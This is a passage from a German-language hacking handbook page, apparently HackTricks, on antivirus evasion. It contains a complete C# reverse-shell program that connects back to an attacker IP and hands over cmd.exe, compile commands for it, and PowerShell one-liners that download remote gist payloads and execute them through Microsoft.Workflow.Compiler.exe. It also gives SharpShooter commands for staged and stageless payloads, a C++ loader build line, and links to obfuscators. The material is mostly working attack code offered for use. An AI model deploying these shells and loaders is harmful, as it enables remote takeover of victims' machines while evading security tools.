c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# mit dem Compiler verwenden

Eine Möglichkeit, Antivirenprogramme zu umgehen, besteht darin, den C#-Compiler zu verwenden. Dies ermöglicht es uns, den Quellcode in eine ausführbare Datei zu kompilieren, die von den meisten Antivirenprogrammen nicht erkannt wird.

Um diese Methode anzuwenden, müssen wir den C#-Quellcode schreiben und dann den Compiler verwenden, um ihn in eine ausführbare Datei zu kompilieren. Hier ist ein Beispiel für den C#-Quellcode:

```csharp
using System;

class Program
{
    static void Main()
    {
        Console.WriteLine("Hello, World!");
    }
}
```

Um den Compiler zu verwenden, öffnen wir die Eingabeaufforderung und navigieren zum Verzeichnis, in dem sich der Quellcode befindet. Dann verwenden wir den Befehl `csc` (C#-Compiler), um den Quellcode zu kompilieren. Hier ist der Befehl:

```
csc /out:program.exe Program.cs
```

Dieser Befehl kompiliert den Quellcode in eine ausführbare Datei mit dem Namen "program.exe". Beachten Sie, dass Sie den Namen der Datei und des Quellcodes entsprechend anpassen müssen.

Nachdem die Kompilierung abgeschlossen ist, können wir die ausführbare Datei verwenden, um den Code auszuführen. In den meisten Fällen wird diese Datei von den meisten Antivirenprogrammen nicht erkannt, da sie als legitime ausführbare Datei betrachtet wird.

Es ist jedoch wichtig zu beachten, dass diese Methode nicht immer erfolgreich ist, da einige Antivirenprogramme möglicherweise spezifische Signaturen oder Verhaltensmuster erkennen können, die auf schädlichen Code hinweisen. Daher ist es ratsam, verschiedene Techniken zu kombinieren, um die Erfolgschancen zu erhöhen.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Liste der C#-Verschleierer: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Andere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
